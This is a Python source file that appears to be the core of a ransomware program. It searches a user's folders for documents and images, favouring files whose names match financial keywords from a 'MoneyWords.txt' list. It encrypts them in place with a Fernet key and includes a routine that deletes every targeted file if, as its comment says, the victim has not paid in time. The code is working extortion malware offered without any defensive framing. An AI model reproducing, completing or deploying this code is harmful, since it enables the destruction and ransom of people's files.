import os
import sys
from cryptography.fernet import Fernet

#Creates a list of files of certain extensions within the given folder, whose file names include keywords from the 'MoneyWords.txt' file in any form
def generate_file_list_keyword(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg','.xlsx')
    file_paths = []
    rfile = open(get_path('MoneyWords.txt'), 'r')
    words = [line[:-1] for line in rfile]
    for root, dirs, files, in os.walk(path):
        for file in files:
            for w in words:
                file_name,file_ext = os.path.splitext(root+'\\'+file)
                if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
                    file_paths.append(root+'\\'+file)
                    break
    return file_paths

#Creates a list of files of certain extensions
def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_name,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    return file_paths

#Creates fernet key
def create_key():
    key = Fernet.generate_key()
    crypter = Fernet(key)
    return crypter, key

#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            data = file.read()
        encrypted = fernet.encrypt(data)
        
        #overwrite the original with the new encrypted version
        os.remove(f)
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#Writes fernet key to text file on the desktop
def write_key(key):
    with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt', 'wb') as filekey:
            filekey.write(key)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet):
    for f in file_paths:
        #create decrypted version of the file
        with open(f, 'rb') as enc_file:
            decrypted = fernet.decrypt(enc_file.read())
    
        #overwrite the original with the new decrypted version
        with open(f, 'wb') as dec_file:
            dec_file.write(decrypted)

    #Removes filekey file from computer after the correct code is used to decrypt all files
    os.remove(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt')

#Function to delete all files from the file path from the computer; used if time runs out and user has not sent money.
def delete_everything(file_paths):
    for f in file_paths:
        try:
            os.remove(f)
        except:
            pass

def get_path(filename):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, filename)
    else:
        return filename


